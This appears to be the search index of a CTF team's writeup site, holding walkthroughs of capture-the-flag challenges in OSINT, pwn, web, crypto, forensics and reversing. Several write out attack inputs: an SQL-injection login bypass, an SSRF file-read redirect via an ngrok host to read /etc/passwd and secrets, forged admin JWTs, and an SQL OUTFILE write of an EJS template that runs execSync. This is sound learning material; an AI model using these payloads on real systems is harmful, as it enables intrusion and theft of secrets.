[[{"l":"TamilCTF","p":["TamilCTF is a team of cybersec enthusiasts from TamilNadu that was formed in 2020. We are more than a CTF team, we hosted TAMILSEC CON(Cybersecurity conference), One International CTF event in 2021-sept and a state level CTF event in 2021-May. Our team consists of players from TamilNadu, who are passionate in Information Security, Ethical Hacking and eager to learn more in this field. The team is currently in 5 position on CTFtime India rankings.","To contact us✨","team.tamilctf.com","github.com/blog-tamilctf"]}],[{"i":"blinks-secret","l":"Blink’s Secret","p":["After searching this username in almost all Social Media platforms, I found this account on twitter.","Blink’s Secret Challenge","DrewScanlon_941","Enter the url of that account and it will show the previous snapshots. We can see the old tweets (actually one tweet in this account \uD83D\uDE01).","flag","Hello Everyone. This is my another blog of solving another challenge of 1337up CTF hosted by Intigriti. My team TamilCTF has scored 10th in this CTF.","If the name is thomas mueller then write the name as ThomasMueller.","image of blinking man","In this writeup we are gonna see an OSINT challenge Blink’s Secret. I am so happy to say that I got first blood for this challenge \uD83D\uDE0A. Also thanks for Paul for collaborating with me in this challenge.","It is the iconic blinking man meme. We need to find his real name.","Let’s see what is in that image.","note.txt","old tweet","So his name is Drew Scanlon. So the password will be DrewScanlon_*.** We need to find his pin-code of current residence. Let’s see his twitter account.","So the note says we need to find someone’s social media account. They have given certain hints to find the account.","So the pincode is 941***. We need only the first three numbers since the username is 15 characters long. So the username will be DrewScanlon_941.","So, In this challenge, they have given a note.txt file and an image. Let’s see what’s in the note.txt file.","That font looks a bit sus isn’t it? I will show you why. Go to https://holloway.nz/steg/. It is a website to hide secret messages in a tweet. Let’s decrypt what’s in it.","That’s a nice hint. In order to see those previous tweets, lets hop into the Wayback Machine.","The format is Name_zipcode.","The username comprises of name and the zip-code of current residence","The username is 15 characters long.","tweet","wayback machine","We need to find the name of the blinking man in the image.","Well that’s the end of this challenge. Hope you like the blog. If you do, make sure to clap and share to your hacker buddies and tech enthusiasts. Follow me on socials for more awesome content, links given below. Let’s see you in next blog until then PEACE OUT✌️.","Well we got the flag \uD83D\uDEA9.","Well, the bio says it all. This account has only one tweet. Let’s take a look at that.","While taking a peek at his twitter account, we came to a conclusion that he lives in San Francisco, California. Let’s find the pin-code of San Francisco."]}],[{"l":"Easyregister"},{"l":"Easy Register","p":["First let's download and analyze the binary"]},{"l":"Info","p":["ELF 64-bit executable","Dynamically linked","Not stripped","checksec:","The Stack is executable because NX is disabled","First let's run the binary and see what it gives"]},{"l":"Analyzing","p":["We have a leak 0x7ffd0421cac0","Most likely, this will be the starting address of our buffer","Then we're prompted to give our name","May be there's a buffer overflow?","Let's decompile this binary and see what it does :D","Cool, they're using gets and it's vulnerable to buffer overflow","Find the offset to Instruction pointer (I didn't mention it in the post because it's very easy)","Now let's write our exploit","First let's store the leak in a variable","Let's put our shellcode at the beginning and fill some junk until RIP","Note: Offset to RIP is 88","Finally let's overwrite the Instruction pointer with the leaked value (our input buffer's starting address)"]},{"l":"Full exploit","p":["We got our flag 1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}"]}],[{"l":"Getting admin access","p":["Chall Name : Getting admin access","Description : Bling bling bling, I bet you're not 1337 enough to shop here! Wait, you need to change /etc/hosts to get this one working??? Yes! To become an admin, you should use /admin","As per description,we have to add the host in /etc/hosts file.First ping the 1337shop.intigriti.io ,we got the IP of that domain ,add that to /etc/hosts file.","Screenshot","And we have the endpoint /admin. On visiting this endpoint it redirects to the login page and i tried lots of ways to bypass this login page but i can't !!.My teammate 0xGodson spoke about Nosqli for some other challs.","I searched for Nosqli payloads and i ends up with this payload","I got logged in !!.","View the PageSource and there's a flag."]}],[{"i":"#","p":["A walkthrough on misc challenge from 1337UP Live 2022"]},{"i":"liikt1337","l":"Liikt#1337","p":["Here goes the challenge description","After downloading the zip file, extracting the contents using password","Doing strings on it,","Seems like we have found first part of the flag It is a memory image & virtual hardisk of VMWare images Importing it into VMWare and started booting it, we will face the login prompt with absolutely no idea of login credentials The only way to bypass this is to use a small trick on GRUB to spawn root shell Changing ro ... in GRUB to rw init=/bin/bash and loading it will give us a root level shell, where we can use passwd command to change password for root user For detailed blog After gaining shell, we can see a user named liikt","Lets find the string flag1:-- START 1337UP{5530491e6c0b5159 with filename, which we found earlier in memory","Now we have to find the second part of the flag After some enumeration","Seems like we have to find some creds for backdoor/ data dump While enumerating I saw MySQL and Postgres installed in this machine My thought is to give a try on those After starting MySQL service,","Lets enumerate it further,","Seems like login creds, but for why From the hint of pwned.txt we can see theres a legit hostname blacknote.ctf.intigriti.io Because, the CTF was hosted on ctf.intigriti.io, it was merely a subdomain Scanning this hostname with nmap,","Seems like SSH is open And from pwned.txt the hint says, backdoor with blackn0te Lets assume the username is blackn0te And from the dumped creds, liikt@hacker.com:best_h3ckerman!69- matches the description While connecting with ssh, it prompts for id_rsa password,","Lets use john to crack it,","It is confirmed that the password for id_rsa is best_h3ckerman!69- Lets use SSH to gain access","So the final flag is 1337UP{5530491e6c0b5159ff82f00c4e57d0bb}"]}],[{"l":"Mirage","p":["A small part of the page source","adding the payload position in Intruder","Another hint. In this they have given a directory which is encrypted using Caesar Cipher (/uncclzrny.wct). Let’s use cryptii again.","Another rabbit hole \uD83D\uDE11. Let’s see the next one /wordlists.txt.","As we can see, there are certain directories which only gave 200 status codes. Let’s look them one by one.","At first, we are gonna see /flag.txt.","Caesar cipher result","cracked password using john","cyberchef result","decoding using cryptii","Finally \uD83D\uDE00. they have given a link to download the flag.zip file. let’s download and extract it.","flag.txt","flag.txt \uD83D\uDE04","flag.zip","flag1.txt","happymeal.jpg","HelpMeOut.txt","Hi Everyone. This time I played 1337up CTF by Intigriti and my team TamilCTF placed 10th in it \uD83D\uDE0A. Let me show how I solved one of the challenges in it, Mirage - Misc.","I had a feeling that most of them would be 404’s and rabbit holes so I fired up Burpsuite to use Intruder and brute-force those directories.","If you visit the link https://mirage.ctf.intigriti.io/happymeal.jpg this image is shown. Let’s visit /HelpMeOut.txt.","Intruder’s result","Let’s visit the link and see what they have for us.","Mirage - Miscellaneous","Of course it is a rabbit hole to troll us \uD83D\uDE10. Well, it’s not going to be that easy. Let’s look at the second one /flag1.txt.","ok.txt","robots.txt","saved text file from robots.txt","So there are certain characters given as flag. lets use cyberchef too find what it is.","So this is how I solved Mirage challenge. Hope you guys like this blog. Make sure to show your support by applauding and sharing the blog with your fellow hackers and tech geeks. Let’s see you in another blog, until then PEACE OUT✌️","So we have found the password which is Soeasypeasy214. Now use the password to open the flag.txt and BOOM!, we got the flag.","So, there are a few directories listed in it. I saved those all in a separate text file.","So, they have given some gibberish. If you read the hint, “Rot Rot Everwhere but not a single Rot to see” we know that we should use Caesar Cipher. I use cryptii.com, but use can use any website you prefer.","the captured request which is send to Intruder","The saved directories are used as payloads to brute-force","The zip file is password protected. We need to use the wordlist wordlists.txt to find the password. We are gonna use john to crack the zip file. First let’s make a file which is compatible for john to crack using zip2john and crack the file using wordlists.txt.","They have given a wordlist saying this will help us later. So, I saved it in a separate file. Now to the last one /ok.txt.","We have found the plaintext which is happymeal.jpg. Let’s see what is in it.","While casually reading the page source, I have seen the word ROBOTS hidden in the website, so I thought of checking whether there is a robots.txt file in it and it is there in the website.","While looking it plainly, we can see it’s just a website. let’s look at the page source.","wordlists.txt"]}],[{"l":"Not My Server","p":["chall : Not my server","Description : Wait, you're an admin? Well, what can you do now?","Well, It was the continuation of Getting admin access challenge.I logged in as admin and i noticed there was an functionality generates the PDF which contains the previous logins username,Date and time , User-Agent strings.","Screenshot","I crafted a html tags in User-agent strings while logging in and it reflects in the PDF and it also vulnerable to SSRF !!.","I want to know which protocol they used to save files and i used this payload to print file location","They used file:/// protocal and i tried iframe to render the /etc/passwd file but it failed.I used XHR requests but it also failed","My teammate 0xGodson helped me to solve this chall.He sent a payload which was working like a king!!","And I can able to read the /etc/passwd file!!!","Finally, The flag is in file:///flag"]}],[{"l":"OptimusPrime","p":["After some googling, you can find this site is relevant to the hint","After some OSINT recon, we could fine the username in github","And the seed value is important to find the exact password","By analysing the metadata we could find the time of modification of this file, which is not always equal to time of creation","By logic, this is the exact/approximate time when the python script should be ran to create this zip file","By running this script, we would get the flag","By understanding the python script, we could see that it generates a random string to compress the zip file","bypthon stuff and pastes buffer","Calculating the timestamps values for these two interals,","Creating a python script to bruteforce the logic,","Finally we get our flag 1337UP{W3ll_1_n3v3r_th0ught_U_c0uuuuuuld_f1nd_m3_308240202}","flag.zip seems interesting","GitHub link","Here goes the challenge description","It is a password protected zip file which we have created from the python script","Pasting our string value in the URI to get the data from it,","Seems like the challenge title is an username","Seems like, it allows us to share code with long URI","So if we bruteforce the seed value with the range of timestamp, it should crack the zip successfully at one point","So there is some interesting string DJVL4REEXP76YXCTXOKK5NQGQM and some hints","There are two repositories in it,","Viewing the commits of first repo,","Viewing the second repo of the username, we can see flag.zip,","We are able to get a python script from this link"]}],[{"l":"Quiz","p":["Chall Name : Quiz","Description : Ready for a little quiz?","On visiting the challenge link,it shows like a normal quiz page which contains 3 questions each questions have 10 marks .Even if we answer correctly for all the questions ,we have only 30 points.But we need 100 points to buy the flag!!.","Screenshot"]},{"l":"Race Condition","p":["A race condition attack happens when a computing system that's designed to handle tasks in a specific sequence is forced to perform two or more operations simultaneously. Eventually, the application is forced to perform unintended actions. This leads the application to security exploitation.","So,We have to perform race condition here to obtain extra points for each question's.Choose the answer correctly and intercept the request with burp and send that request to intruder and add the NULL payloads in Referrer header and start the attack,You can see the extra points added !!!.","Screenshot","Repeat this steps for remaining two questions ,We obtain 100 points !!."]}],[{"l":"FoobarCTF 2022 Crypto writeup","p":["# {2: 2, 175143733: 1, 2638480856911: 1}","# send 2 times","#1848453546913725555052# composite number t = str(1848453546913725555052)#factorization","#print(p)","a= 0x1c5db869a64 fc 002c8e05674ee4a2bbf9224898bb739026227631384760d8f1003749625766177219aff81f5c71f52a80be1467e494e03abf7f86edfd6d94b07d45 cd 8ad67866e62ada1a27c06b3d168e13a4aa47800019ee861613a22429a95da14cace342c0fcac16d94bbcddb15197a2d3ce5bc6a45b50bdbeeee2db317c5","b= 0x1c5db869a64 fc 002c8e05674ee4a2bbf9224898bb739026227631384760d8f1003749625766177219aff81f5c71f52a80be1467e494e03abf7f86edfd6d94b07d45 cd 8ad67866e62ada1a27c06b3d168e13a4aa47800019ee861613a22429a95da14cace342c0fcac16d94bbcddb15197a2d3ce5bc6a45b50bdbeeee2db317c5","c = 0x4be8e2be903156548ce7557137aff5012337a44337d1e4ac5d998a10c3a9522636e7004bc5defe9df50948fae5dc6252e9853559647283 fc 191ed8e291e53493f8eba8ecfb65ca85a2782355841170e9f44b6317d173a55865f5e79 cd 63621122a75d46b49a68bfd04dbc67737e08c07f7fddf4ed4d8c89e11e5efaf879d01dd","d = 0x4a02d85926feb2db2281335ac468ce3 fc 1824881610e052d2ad233b0a2cbce224beaf3c7d77eb82441d37e2253cf07b0c6cad19b7b1168766b3c3ab8ed3408726a22a07eac33c5a8144658c102b8e774d0ac404173af90997477300385b9b6e002b7858 cd 299c351062172c526c01d2dc287b37bfc81eb5972330163aa0e073b","d= inverse(e, phi) m= bytes_to_long(flag) c= pow(m, e, N) x= (p * q) % 2** 1337","d= inverse(e,phi)","d= inverse(x, 2** 1337)","Flag: GLUG{fl4g_15_53rv3d_xD_E9644V2GG0}","flag= b\"GLUG{ REDACTED*****}\"","n = 0x9f1a727af5b7785285056b713468039e2f109d2887154b52dbe7c182e2c3a0115e1f361ec9cf6f24b7f19e2da7b0d08a489591d106c5c4c8db07390d8d69b5eee31461a0b11b5383fdf42cdbe67c8385858aa3b7689cf8a0dd63387748c03b9918a5f0157d74 fc 5f02e14bf32561ded9f962b9ce8b0d6d748ab3af671321d5d3 print(\"[+] Hex message : \"+TOKEN.encode(\"hex\")) sign = a b c* d % n","N= 2 1337 #x = (p * q) % 2 1337","p_p= p* p","p, q= getPrime( 1024),getPrime( 1024) N= p * p * q e= 0 x10001 phi= p * (p- 1) * (q- 1)","p= 139387518986826536509144049219128127758120617287987945818827279314602564142349682985769656023092456357155296439247793458178075113354440414475867450674127064081966333660528171321853175654236647699883371985059454473707508426015442275267745798448560385920139928240405884255349873045306634707812262346541658507253","p= d * n % N","phi= p * (p- 1)*(q- 1)","print(\"[+] signature :\"+str(hex(sign))[:-1])","print(\"N = \".format(N)) print(\"e = \".format(e)) print(\"c = \".format(c)) print(\"x = \".format(x)) Output:","print(long_to_bytes(175143733).encode(\"hex\"))","print(long_to_bytes(2).encode(\"hex\"))","print(long_to_bytes(2638480856911).encode(\"hex\"))","print(long_to_bytes(pow(c,d,n)))","q= n // p_p"]}],[{"l":"HSCTF 2023 Web writeup"},{"l":"HSCTF-2023 writeups","p":["Category - WEB"]},{"i":"chall-1--th3-w3bsite","l":"Chall 1 → th3-w3bsite","p":["chall link - https://th3-w3bsite.hsctf.com/","Description :","It's a really simple w3bsite. Nothing much else to say. Be careful though.","Solution :","By seeing the source code , we can able to get the flag .","Flag : flag{1434}"]},{"i":"chall-2--an-inaccessible-admin-panel","l":"Chall 2 → an-inaccessible-admin-panel","p":["chall link - https://login-web-challenge.hsctf.com/","Description :","The Joker is on the loose again in Gotham City! Police have found a web application where the Joker had allegedly tampered with. This mysterious web application has login page, but it has been behaving abnormally lately. Some time ago, an admin panel was created, but unfortunately, the password was lost to time. Unless you can find it...","Can you prove that the Joker had tampered with the website?","Default login info: Username: default Password: password123","Solution :","By looking the source code , the webpage have login.js file for validating the login.","So, what actually happening here was, if the username is equals to Admin and the given password is encrypted using above validatepassword() function. We have to reverse this process for the key[] array to find a password !!. I decided to encrypt all the printable characters using this above logic and match with the key array to find a original key!!.","Here is the script to find a key .","Here is the decrypted key :","Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!","Using this key , we can able to login and redirected to admin_panel.html","Flag : flag{Admin , Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!}"]},{"i":"chall-3--mogodb","l":"Chall 3 → mogodb","p":["link - http://mogodb.hsctf.com/","Description :","The web-scale DB of the future!","Solution:","They gave the source code for the challenge , on inspecting main.py it has some routes to login and register .","We can see here , the user input directly appends into the query inside single quotes. SQLi !!!","Here is the payload to bypass the authentication .","user=adminpassword='+||+'1'=='1","Bypassed !!","Flag : flag{easier_than_picture_lab_at_least}"]},{"i":"chall-4---very-secure","l":"Chall 4 - very-secure","p":["link - http://very-secure.hsctf.com/","Description :","this website is obviously 100% secure","Solution:","They gave the source code for this challenge .","on inspecting the app.py, we can see the SECRET_KEY is the random of length 2 bytes!!","So , we can able to bruteforce the SECRET_KEY easily!!","For that we have to generate the random bytes length of 300.","Using flask-unsign we can able to bruteforce the secret_key","‘p6’ is the secret key used!!.","Now , we have to sign the token using this secretkey","So using this token , we can able to get the flag !!."]},{"i":"chall-5-fancy-page","l":"Chall 5 →fancy-page","p":["link : http://fancy-page.hsctf.com/","Description : hmmm","Solution:","In this webpage , we can able to create a content and send that content to the admin bot.","So, if we popup XSS , we can able to steal any info from the admin bot!!.","They gave the source code of the challenge.","On inspecting the display.js , it replaces the script,on,iframe,object,embed,cookie elements to “”.","so, what if we give the input like scrscriptipt. It removes the script string inside that string and it became again script !!.","So, the actual payload is","submit the created content url to the bot server.!!","Here is the flag : flag{filter_fail}"]}],[{"l":"Blueprint Heist"},{"l":"Blueprint Heist","p":["Challenge source file"]},{"i":"initial-analysis","l":"Initial Analysis:","p":["The challenge is placed in a medium web category, the first thing i noticed was routes, there were two routes internal and public."]},{"i":"public-route","l":"public route:","p":["/report/progress and /report/enviromental-impact is not much of an use,the /getToken endpoint seems to generate a guest token and /download endpoint uses authMiddleware(guest) and convert some PDF we will look this soon.","const secret = process.env.secret- importing secret from env file and uses it for jwt sign and verify.","When we call the /getToken endpoint, it uses the generateGuestToken to create a JWT for role user.","authMiddleware - verifies the role specified in jwt and also there is additional check to verify if the user is admin requiredRole === admin role === admin and then it checks checkInternal(req)","checkInternal(req) seems to require the request to be orginating from 127.0.0.1."]},{"i":"internal-route","l":"internal route:","p":["/admin and /graphql needs admin JWT authentication."]},{"l":"Initial attack with gathered information","p":["We start with using the /getToken endpoint to generate a user jwt token and supply in router.post(/download, authMiddleware(guest) download endpoint.","$curl http://94.237.62.237:43315/getToken /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjI5OTY1M30.s54nJAARbBoidYio4dz7YsrsDrLfekrGaQ4DC_n1BY8","We have the user token and lets inspect the download endpoint.","It gets const { url } = req.body; url from the POST body and convert it to PDF using wkhtmltopdf! hmmm.....interesting","I tried https://google.com and its contents are converted into pdf.","While trying this, i got stucked in a rabbit hole out of nowhere."]},{"i":"the-rabbithole-out-of-nowhere","l":"The rabbithole out of nowhere:","p":["while i looking through the files,i found .env file have been provided to us!","The DB password and secret seemed valid, so i ceased my progress and went on creating admin JWT with the found secret.","I tried to verify my crafted admin token and found it was invalid or expired token.","GET /admin?token=token","Trying multiple things for a while,then i thought of verifying the guest token locally with the secret ! IT FAILEDDDDD!","<img/src=\"node.jpeg\">","It was not the legit secret ! ahhh getting back to my old progress."]},{"i":"getting-back-to-the-download-endpoint","l":"Getting back to the /download endpoint:","p":["Upon analysing the wkhtmltopdf version through produced pdf wkhtmltopdf 0.12.5,there is an SSRF vulnerability and we can read local files with it.","Exploit : https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/","We need to host a php file ?php header('location:file://'.$_REQUEST['x']); ? and call it the post url to trigger the ssrf.","url=http://ngrok_url/test.php?x=/etc/passwd","The idea is to read the real secret inside /app/.env through the ssrf and forge the admin token for further exploitation.","Okay! we found the real secret key this time :D","Crafted the admin token and supplied to the endpoint admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk","We have a valid admin token, now we need to bypass the checkInternal(req) function."]},{"i":"more-ssrf","l":"More SSRF:","p":["Since we have an ssrf within the url param and we can use that to call the internal endpoint? and it will satisfy the checkInternal(req).","By going through the source file,the application was exposed on 1337 port and binded on 0.0.0.0","We can supply http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk in the url to see the response.","We have the admin token and way to make internal requests and hence now we can start checking the internal routes for further escalation."]},{"i":"graphql-and-sqli","l":"Graphql and SQLI??","p":["!!!! New line injection , we found our regex bypass!","At glance seemed like a easy SQLI SELECT * FROM users WHERE name like '%${args.name}%' but not :(","Got stuck at this point for a while,i thought there is no way to bypass the regex and started to do lot of workarounds.","Maybe gopher to sql? we have db username and pass [FAILED]","Now we can try the graphql search query to exploit the sqli injection possibly?","The detectSqli function blocks all the possible special characters in our graphql query before appending to the sql query.","The flag.txt was compiled as a binary named /readflag","The internal route has a graphql endpoint router.all(/graphql, authMiddleware(admin) and reviewing the source reveals a potential sql injection.","Then i tried to validate the regex once again! [best decision]","There were only two queries getAllData which will list all user data and getDataByName where we can supply a name and it will search for the username.","Tried reading lot of system files through ssrf [NOTHING INTERESTING]","We got through this ! now we need to somehow escalate this sqli to read the flag.","We know graphql supports get method too and we can try that to execute a query.","We need to call the binary through sqli?","With that in hand, i tried to inject the newline sql injection to break the query and noticed whether any error appeared.[{getDataByName(name:John\\n '){name%20department%20isPresent}}]","Within the admin endpoint, there is option to search username and get all users through graphql which was executing in POST request."]},{"i":"sqli-write-and-ejs-template-injection","l":"SQLI write and EJS template injection:","p":["We have the db file given,we have 4 columns and 2 columns name,department are TEXT,hence it will reflect.","Forming the SQL query ' UNION SELECT 1,user(),database(),4-- -","Noticed we can do load_file and outfile with the SQLI.","LOAD FILE: Reads the file from the server and returns to the user on the screen, It will show the file contents as a string on the screen.","OUTFILE: it writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format. the file is created on the server host, so you must have the file privilege to use this syntax. File to be written cannot be an existing file, which among other things prevents files (such as “/etc/passwd”) and database tables from being destroyed.","ref : https://blog.certcube.com/advance-sql-injections-with-loadfile-and-outfile/","Then i tried loading the /readflag into the injection point, below were the result - printed as binary !!","We know now the attack point is to write a file and maybe get a reverse shell to /readflag or even print the result of /readflag somehow.","Got stuck here for sometime to identify where we need write our file to make the server display flag.","Then malformx(teammate) gave an idea to write our payload as ejs and make the server render it! but how?","Here depend on the error status code, a template file is rendered from /views/errors/{errorcode}.ejs and if it does not found returns to error.ejs.","We cant override any exisiting files ,maybe we should prdouce a non generic error code and write a file within /views/errors/{ourerrorcode}.ejs to render our flag?","Quickly noticing the file structure.","wewww! there is no 404 template and it easy to trigger a 404 error, so our idea is to write a 404.ejs using SQLi outfile and render a template to read the flag.","The payload to write p%=process.mainModule.require('child_process').execSync('/readflag') %/p as 404.ejs and into the directory /app/views/errors/404.ejs"]},{"i":"payload","l":"Payload:","p":["We need to send the above payload in the request.","Now we just need to trigger the 404 error by calling not existing files in the server to retrieve the flag.","We finally cracked the challenge! That was quite a bit of chaining."]}],[{"i":"#","p":["Beginner Level Interesting Challenges From INCTF21 PRO Finals"]},{"l":"Inctf 21 Pro Finals Forensics Writeup"},{"i":"hello-amazing-hackers","l":"Hello Amazing Hackers!","p":["In this Blog We are going to have a look at some cool forensic challenges from inctf21 professional by bi0s Beginner Level Interesting Challenges From INCTF21 PRO Finals"]},{"i":"1-xoxo-100pts","l":"1. XOXO (100pts)","p":["image","Description: Did you know: if a^b=c then a^c=b","Given : xorred png file","We actually Dont know the key , but we know the actual extension(png) which is come after the xor process. then xor the file with magic bytes of png , it will gives the Key to retrive the PNG Magic Bytes of PNG","2. Xor the encrypted.png with the key eAsy-x0r","Here We go ,FLAG : inctf{x0riNg_iS_fUn!!}"]},{"i":"2-look-deeper-200pts","l":"2. Look Deeper (200pts)","p":["image","Description: Ramesh sent me this PDF and told me that there is a weird sound deep in it, and asked me to find it. Can you help him find the what is hidden deep?","Given:","Evince the pdf image","I thought vigenere, yes vigenere cipher","well, it's not a flag but let's take it w3ll_7ry_n0_fl4g_bu7_us3ful","Lets enum the pdf and extract any file","wave time !","From Description deep? exactly deepsound!","open the wave in deepsound and input the decrypted cipher as a password","open carrier file","input password","save the flag.zip image","unzip flag.zip correct the header of flag.png remove the line ......JFIF...... from flag.png using ghex"]},{"i":"flag--inctfkn0w1ng_4b0ut_pdfs_15_u53ful","l":"Flag : inctf{Kn0w1ng_4b0ut_PDF's_15_u53fuL}"},{"i":"3-chunklet-100pts","l":"3. Chunklet (100pts)","p":["reference-inctf-nationals Learning Round","given:","Correct the png header","Replace idhr to IHDR","Replace IADT to IDAT","image","Replace The trailer from INED to IEND","feh chall.png","Here we Go"]},{"i":"flag--inctf","l":"Flag : inctf"}],[{"i":"#","p":["Cool Beginner Friendly Challenges from KnightCTF{2022}"]},{"l":"Digital Forensics"},{"i":"hello--amazing-ctf-players","l":"Hello Amazing CTF Players","p":["Lets have a look at some Begginer Friendly forensic challenges https://imgur.com/qgyJgLJ.png"]},{"i":"ctf-name--knightctf-2022","l":"CTF Name : KnightCTF 2022"},{"i":"category--digital-forensics","l":"Category : Digital-Forensics"},{"i":"1compromised-ftp","l":"1.Compromised FTP","p":["image","Given:","They asked for the correct login username and ip address"]},{"l":"2. Lost Flag","p":["https://imgur.com/clXrXPC.png","Given:","You can use stegoveritas , aperisolve.fr or stegsolve","Here im using stegsolve","File -> Open -> image.png","https://imgur.com/hwUqdlp.png"]},{"l":"3. Lets Walk Together","p":["image","From the challenge name you can conclude that its exactly about binwalk !","get into the extracted file directory and do fcrackzip","cd _ interesting_waves.png.extracted","Zip file is passwod protected","Thats all"]},{"i":"4unknow-file","l":"4.Unknow File","p":["image","Just Correct the first 4 magic bytes of the given file","89 50 4E 47","Reference about magic bytes manipulation :","INCTF-Junior-Finals","INCTF_Nationals-LR","INCTF-Pro-Finals"]}],[{"l":"Pwn"},{"i":"whats-your-name-50-points","l":"What's your name [50 points]","p":["They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA"]},{"l":"Main function","p":["disas-main","gets() is vulnerable to buffer overflow","in line 14 they're checking the value 100 is still in that variable or not","If we overwrite that variable then the if condition will be statisfied means the value 100 will be overwritten","So we can get the flag","Ok how we can do that?","char user_input array can store upto 60 bytes","in memory after the user_input there will be the value of the integer (100)","so if we give more than 60 bytes it'll overwrite that integer","let's try that","Now let's try this at remote server","Nice we got our flag KCTF{bAbY_bUfF3r_0v3Rf1Ow}"]},{"i":"whats-your-name-2-100-points","l":"What's your name 2 [100 points]","p":["They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA"]},{"i":"main-function-1","l":"Main function","p":["And we can add comments too (by pressing ; semicolon in that particular line)","Before going to next breakpoint we need to set this register value as 0x5445454c","Don't forget we need to convert these values into little endian format","Fine now let's write our exploit","First let's find in which offset they are located","I think I explained in the picture so it's enough to understand the vulnerablity, lets skip to the exploitation part","In ghidra we can reaname a variable by pressing L or right click it and do rename variable","In line 22 there are two condition checks","Let's open it with gdb and disassemble the main function","Let's set breakpoints in both compare instructions","Now we hit our 2nd breakpoint, let's see what's in eax register","One with 0x5445454c, anther one with 0x534b544e","run it. I'm giving a pattern here as input","set $eax=0x5445454c and continue","So we need to overwrite those values","So we need to place 0x534b544e at 72nd position","So we need to place 0x5445454c at 76th position","That's what I did here, so don't confuse coz it's different.. It's fully for your understanding purpose","Then only it jumps to next comparison, otherwise it directly exits","We hit our first break point, let see what's in eax register"]},{"l":"Exploit script","p":["Nice it works, let's send this in remote server","Cool we got our flag KCTF{bUfF3r_0v3Rf1Ow_i5_fUn_r1Gh7}"]},{"i":"hackers-vault-100-points","l":"Hackers Vault [100 points]","p":["They gave us a zip file to download, so lets unzip it and add the binary file to GHIDRA","I was concentrating on other challenge so I automated this challenge with angr"]},{"l":"angr script","p":["I know it's too much for this","But it works, that's what we need","IN REMOTE","flag KCTF{b1NaRy_3xOpL0iTaT1On_r0cK5}","That's all for this category, easy pwns \uD83D\uDE1B"]}],[{"l":"Reverse Engineering"},{"l":"The Flag Vault","p":["Basic Info:","File command","It's an ELF 64bit executable.","Strings command","There are some interesting strings and library calls ( strcmp ). So run it and see how it works and it ask us for the password, we give the password string and the output is wrong.","For further analysis, load the binary in gdb and disassemble the main function","Look at the main + 242 line instruction, it compare two strings. Let's set breakpoint at main+242 and examine the values.","Now run the program with some random string, here i used password as input.","After hitting the strcmp instruction ,examine the two values. First one is the password and the second one is our input. Now run the binary with finded password.","The Flag is KCTF{welc0me_t0_reverse_3ngineering}"]},{"l":"The Encoder","p":["Basic Info:","File command","It's an ELF 64bit executable and not stripped binary.","Strings command:","Nothing interesting. Now run the binary and see how it works. It print welcome message and ask for plain text to encrypt ( the input length must within in 40 character )","Enter hello guys as input, it gives some numbers \uD83D\uDE44. They are given the encrypted flag, now we need to decrypt it.","Now enter the all printable character as input, it gives the encrypted value for corresponding input. Let's make a script which find the correct value of flag by its encrypt value.","For example the first encrypted value is 1412, the script find the index of 1412 in value variable and print the finded index value of alpha. Now run the script","The Flag is KCTF{s1Mpl3_3Nc0D3r_1337}."]},{"l":"Baby shark"},{"l":"Basic Info"},{"l":"File command","p":["It is java archieve data (JAR). Now unzip the jar file and analysis the files.","There is one audio.wav file, but there is nothing interesting. The flag.class contain nothing. So grep the all files , but there is no flag. Cat the string.class, it contain some base64 encode value. So decode it.","Yeah!!! There is flag KCTF{7H15_w@5_345Y_R16H7?}"]},{"l":"Knight Vault"},{"i":"basic-info-1","l":"Basic Info"},{"i":"file-command-1","l":"File command","p":["It's an ELF 64bit executable and not stripped binary."]},{"l":"Strings command","p":["Nothing interesting. Now run the binary and see how it works. It print hello message and ask for password.","Enter 12345 as input, it gives wrong password. Load the binary in ghidra to analysis. Look at the main function, it take a input from user and modified the input by subtract 10 in given input.","If modified value is equal to \"A\", it change into \"\". Finally it check the modified input with some strings. Let's make the script, We have value which is compare with modified input. So adding 10 in compare value if the compare value is \"\", then add \"A\" and 10.","Finally it print the flag. Execute the script and check the flag is correct or wrong.","The Flag is KCTF{s0_y0u_g0t_mE_gOOd_jOOb_hApPy_hAcKiNg}"]},{"l":"Switch Bank"},{"i":"basic-info-2","l":"Basic Info"},{"i":"file-command-2","l":"File command","p":["It's an ELF 64bit executable and not stripped binary."]},{"i":"strings-command-1","l":"Strings command","p":["Nothing interesting. Now run the binary and see how it works. It print Knight Switch Bank message and ask for password.","Enter 1234567890 as input, it gives wrong password. Load the binary in ghidra to analysis. Look at the main function.","It take a input from user. There is one for loop and four if conditions,The for loop iterate every single character into if conditions. The First condition check if input is less than \"A\" or greater than \"M\", if it failed, it subtract 13 from input. Otherwise it goes to second if condition. The Second if condition check the input is less than 'a' or greater than 'm', if it failed, it subtract 13 from input. If the condition is true, it goes to third if condition. The Third if condition check the input is less than 'N' or greater than 'Z'. If the condition failed, it add 13 in input, if it true it goes to fourth if condition. The Fourth if condition check the input is less than 'n' or greater than 'z'. If the condition failed, it add 13 in input. Otherwise it add 32 in input. Finally it add 2 in modified input and check with some string. Let's make a script.","We have the compare string, subtract 2 from the compare string. And write if condition as same as in the challenge binary, but change arithmetic operations like if the challenge add 13 in input, we have to subtract 13 from input ( Change the arithmetic signs ). Now run the script and check the output is correct or wrong.","The output is KCTF. Now run the challenge binary with the script output, but it gives wrong password. By guessing change \"loh\" into \"YoU\", now check it again.","Yeah!! This time the Flag is correct. The flag is 